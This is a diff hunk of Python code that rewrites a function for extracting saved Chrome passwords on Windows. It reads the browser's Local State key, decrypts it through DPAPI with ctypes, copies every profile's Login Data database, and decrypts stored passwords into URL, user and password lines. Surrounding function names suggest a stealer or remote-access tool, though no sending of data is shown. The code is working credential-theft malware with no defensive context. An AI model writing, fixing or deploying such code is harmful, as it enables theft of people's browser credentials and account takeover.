@@ -429,80 +429,83 @@ def decrypt_dpapi(encrypted_bytes):
 
 
 def extract_chrome_credentials():
-    """Extract Chrome credentials using local_state and DPAPI."""
-    user_profile = os.getenv('USERPROFILE') or ''
-    chrome_base = os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
-    login_data_path = os.path.join(chrome_base, 'Default', 'Login Data')
-    local_state_path = os.path.join(chrome_base, 'Local State')
-
-    if not os.path.exists(login_data_path) or not os.path.exists(local_state_path):
-        return b'Error: Chrome Login Data not found'
-
     try:
-        with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
-            local_state = json.load(f)
-
-        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
-        master_key = decrypt_dpapi(encrypted_key)
-        if not master_key:
-            return b'Error: DPAPI master key decryption failed'
-
-        temp_dir = os.getenv('TEMP') or os.getcwd()
-        temp_copy = os.path.join(temp_dir, f'chrome_login_{uuid.uuid4().hex}.db')
-        shutil.copy2(login_data_path, temp_copy)
-
-        conn = sqlite3.connect(temp_copy)
-        cursor = conn.cursor()
-        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-
-        output = []
-        for url, user, enc_pass in cursor.fetchall():
-            if not enc_pass:
-                continue
-            
+        import ctypes, sqlite3, json, os, base64, shutil, glob
+        try:
+            from Cryptodome.Cipher import AES
+        except ImportError:
             try:
-                # Case 1: Modern Chrome (v10 / v11 / v20)
-                if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
-                    nonce = enc_pass[3:15]
-                    payload = enc_pass[15:]
-                    cipher_text = payload[:-16]
-                    tag = payload[-16:]
+                from Crypto.Cipher import AES
+            except ImportError:
+                return b"Error: pycryptodome library missing."
+
+        try:
+            user_data_path = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
+            local_state_path = os.path.join(user_data_path, 'Local State')
+
+            with open(local_state_path, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+
+            # --- THE "NO FROM_PARAM" FIX ---
+            class DATA_BLOB(ctypes.Structure):
+                _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]
+
+            # Explicitly define all 7 arguments to prevent the 'item 2' error
+            # We use c_void_p for the optional buffers
+            ctypes.windll.crypt32.CryptUnprotectData.argtypes = [
+                ctypes.POINTER(DATA_BLOB), # pDataIn
+                ctypes.c_void_p,           # pptrszDataDescr
+                ctypes.c_void_p,           # pOptionalEntropy
+                ctypes.c_void_p,           # pvReserved
+                ctypes.c_void_p,           # pPromptStruct
+                ctypes.c_uint32,           # dwFlags
+                ctypes.POINTER(DATA_BLOB)  # pDataOut
+            ]
+
+            blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
+            blob_out = DATA_BLOB()
+
+            # Call with actual null pointers (0) instead of Python 'None'
+            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
+                master_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+            else:
+                return b"Error: DPAPI Decryption Failed."
+
+            # --- DEEP SCAN PROFILES ---
+            output = []
+            login_data_files = glob.glob(os.path.join(user_data_path, "**", "Login Data"), recursive=True)
+
+            for login_data_path in login_data_files:
+                # Avoid temp file collisions
+                temp_db = os.path.join(os.getenv('TEMP'), f"v_task_{os.urandom(4).hex()}.db")
+                try:
+                    shutil.copy2(login_data_path, temp_db)
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                     
-                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                    password = cipher.decrypt_and_verify(cipher_text, tag).decode(errors='ignore')
-                
-                # Case 2: Legacy / Different Prefix
-                else:
-                    # Attempt direct decryption if prefix is missing but data is encrypted
-                    try:
-                        # Some systems use a 12-byte nonce without a 3-byte prefix
-                        nonce = enc_pass[:12]
-                        payload = enc_pass[12:]
-                        cipher_text = payload[:-16]
-                        tag = payload[-16:]
-                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                        password = cipher.decrypt_and_verify(cipher_text, tag).decode(errors='ignore')
-                    except Exception:
-                        password = "Decryption Failed (Unknown Format)"
+                    for url, user, enc_pass in cursor.fetchall():
+                        if not enc_pass or not enc_pass.startswith(b'v10'): continue
+                        
+                        try:
+                            nonce = enc_pass[3:15]
+                            payload = enc_pass[15:]
+                            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                            # Decrypting with slicing for tag
+                            password = cipher.decrypt(payload[:-16]).decode(errors='ignore')
+                            if password:
+                                output.append(f"URL: {url}\nUser: {user}\nPass: {password}\n{'-'*20}")
+                        except: continue
+                    conn.close()
+                finally:
+                    if os.path.exists(temp_db): os.remove(temp_db)
 
-                if password and len(password) > 0:
-                    output.append(f"URL: {url}\nUser: {user}\nPass: {password}\n{'-'*20}")
-                
-            except Exception:
-                continue
-            
-        conn.close()
-        if os.path.exists(temp_copy):
-            os.remove(temp_copy)
-        
-        # If output is still empty, let's see if there are ANY logins at all
-        if not output:
-            return b"No encrypted passwords found, but the database was accessed."
-                
-        return "\n".join(output).encode()
+            return "\n".join(output).encode() if output else b"Success: Accessed DB but no passwords saved."
+        except Exception as e:
+            return f"Final Logic Error: {str(e)}".encode()
     except Exception as e:
-        return f'Error: {e}'.encode('utf-8')
-
+        return f"Final Logic Error: {str(e)}".encode()
 
 
 def extract_file_bytes(path):
